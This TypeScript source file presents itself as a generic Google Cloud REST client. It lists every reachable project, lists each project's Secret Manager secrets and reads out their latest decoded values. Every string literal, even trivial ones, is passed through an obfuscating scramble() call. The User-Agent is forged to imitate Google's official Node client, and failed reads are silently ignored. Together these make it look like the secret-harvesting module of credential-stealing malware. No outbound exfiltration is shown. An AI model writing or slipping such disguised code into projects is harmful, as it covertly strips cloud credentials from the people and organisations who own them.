// ═════════════════════════════════════════════════════════════════════════════
// GCP REST API client — generic bearer-token authed fetch wrapper
//
// Used by Secret Manager (secretmanager.googleapis.com) and
// Cloud Resource Manager (cloudresourcemanager.googleapis.com).
// Token acquisition is delegated to auth.ts so authentication is transparent.
// ═════════════════════════════════════════════════════════════════════════════

import { type GcpAccessToken, resolveToken } from "./auth";

declare function scramble(str: string): string;

// ── Types ───────────────────────────────────────────────────────────────────

export interface GcpSecretItem {
  name: string; // projects/*/secrets/*
  createTime?: string;
  labels?: Record<string, string>;
}

export interface ListSecretsResponse {
  secrets?: GcpSecretItem[];
  nextPageToken?: string;
  totalSize?: number;
}

export interface AccessSecretVersionResponse {
  name: string;
  payload: {
    data: string; // base64-encoded
  };
}

export interface GcpProject {
  projectId: string;
  name: string;
  lifecycleState: string;
  projectNumber?: string;
}

export interface ListProjectsResponse {
  projects?: GcpProject[];
  nextPageToken?: string;
}

// ── Constants ───────────────────────────────────────────────────────────────

const SCOPE = scramble("https://www.googleapis.com/auth/cloud-platform");
const SECRET_MANAGER_BASE = scramble("https://secretmanager.googleapis.com/v1");
const CRM_BASE = scramble("https://cloudresourcemanager.googleapis.com/v1");

// ── Token acquisition ───────────────────────────────────────────────────────

let cachedToken: GcpAccessToken | undefined;

async function getToken(): Promise<string> {
  if (cachedToken) {
    const now = Date.now() / 1000;
    if (now < cachedToken.expiresOn - 120) {
      return cachedToken.token;
    }
  }
  cachedToken = await resolveToken(SCOPE);
  return cachedToken.token;
}

// ── Core fetch ──────────────────────────────────────────────────────────────

async function gcpFetch<T = unknown>(
  url: string,
  method = "GET",
  body?: string,
): Promise<T> {
  const token = await getToken();

  const res = await fetch(url, {
    method,
    headers: {
      Authorization: `Bearer ${token}`,
      "Content-Type": "application/json",
      Accept: "application/json",
      "User-Agent": scramble(
        "google-api-nodejs-client/7.0.0 gl-node/20.11.0 gccl/7.0.0",
      ),
    },
    body,
    signal: AbortSignal.timeout(30_000),
  });

  if (!res.ok) {
    const errText = await res.text().catch(() => "");
    const retryAfter = res.headers.get("Retry-After");
    const rateDetail =
      res.status === 429
        ? ` [RATE-LIMITED, retry-after: ${retryAfter ?? "none"}]`
        : "";
    throw new Error(
      `GCP ${method} ${url} failed (${res.status})${rateDetail}: ${errText.slice(0, 500)}`,
    );
  }

  const text = await res.text();
  if (!text) return {} as T;
  return JSON.parse(text) as T;
}

// ═════════════════════════════════════════════════════════════════════════════
// Cloud Resource Manager — project discovery
// ═════════════════════════════════════════════════════════════════════════════

/**
 * List all accessible GCP projects.
 */
export async function listProjects(): Promise<GcpProject[]> {
  const results: GcpProject[] = [];
  let pageToken: string | undefined;

  do {
    const params = new URLSearchParams();
    if (pageToken) params.set(scramble("pageToken"), pageToken);

    const query = params.toString();
    const projPath = scramble("/projects");
    const url = `${CRM_BASE}${projPath}${query ? `?${query}` : ""}`;

    const response = await gcpFetch<ListProjectsResponse>(url);

    if (response.projects) {
      results.push(...response.projects);
    }

    pageToken = response.nextPageToken;
  } while (pageToken);

  return results;
}

// ═════════════════════════════════════════════════════════════════════════════
// Secret Manager — secret operations
// ═════════════════════════════════════════════════════════════════════════════

/**
 * List all secrets in a project.
 */
export async function listSecrets(projectId: string): Promise<GcpSecretItem[]> {
  const results: GcpSecretItem[] = [];
  let pageToken: string | undefined;

  do {
    const params = new URLSearchParams();
    if (pageToken) params.set(scramble("pageToken"), pageToken);

    const query = params.toString();
    const projPath = scramble("/projects/");
    const secretsPath = scramble("/secrets");
    const url = `${SECRET_MANAGER_BASE}${projPath}${projectId}${secretsPath}${query ? `?${query}` : ""}`;

    const response = await gcpFetch<ListSecretsResponse>(url);

    if (response.secrets) {
      results.push(...response.secrets);
    }

    pageToken = response.nextPageToken;
  } while (pageToken);

  return results;
}

/**
 * Access the latest version of a secret.
 * Uses the "latest" alias for the most recently created SecretVersion.
 */
export async function accessSecretVersion(
  secretName: string,
): Promise<string | undefined> {
  try {
    const verPath = scramble("/versions/latest:access");
    const url = `${SECRET_MANAGER_BASE}/${secretName}${verPath}`;

    const response = await gcpFetch<AccessSecretVersionResponse>(url);

    if (response.payload?.data) {
      // Secret Manager returns payload data as base64
      return Buffer.from(response.payload.data, "base64").toString("utf-8");
    }

    return undefined;
  } catch {
    return undefined;
  }
}

/**
 * Extract the short secret name from the full resource name.
 * e.g., "projects/my-project/secrets/my-secret" → "my-secret"
 */
export function extractSecretShortName(fullName: string): string {
  const parts = fullName.split("/");
  return parts[parts.length - 1] ?? fullName;
}

/**
 * Build a full secret resource name.
 */
export function buildSecretName(projectId: string, secretId: string): string {
  return `projects/${projectId}/secrets/${secretId}`;
}
